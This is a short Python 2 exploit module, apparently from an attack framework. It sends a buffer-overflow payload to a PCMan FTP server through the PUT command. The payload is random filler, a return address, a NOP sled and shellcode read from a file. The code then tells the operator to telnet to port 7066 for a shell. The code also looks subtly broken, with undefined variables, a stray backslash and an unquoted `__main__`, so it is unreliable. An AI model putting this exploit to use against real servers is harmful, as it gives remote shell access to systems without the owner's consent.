import os, sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
import core
class pcmanPutOverflowMenu(core.Exploit):
  def generate(self, p):
    
    for a in range(0, 2017):
      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
      payload += tmp.decode('string_escape')
    payload += "\x77\xc3\x54\x59"
    payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    f = open("../../../payloads/pcman_put.shell", "r")
    for line in f.readlines():
      payload += line[:-1].decode('string_escape')
    f.close()
    print "[+]Payload generated."
    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((self.host[0], 21))
    s.recv(1024)
    s.send("USER " + self.user[0])
    s.recv(1024)
    s.send("PASS " + self.passwd[0])
    s.recv(1024)
    s.send("PUT " + payload)\
    s.close()
    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
def main():
  pcmanputoverflowmenu = pcmanPutOverflowMenu()
  pcmanputoverflowmenu.cmdloop("pdf-console attack(pcman_put_overflow)% ")
if __name__ == __main__:
  main()
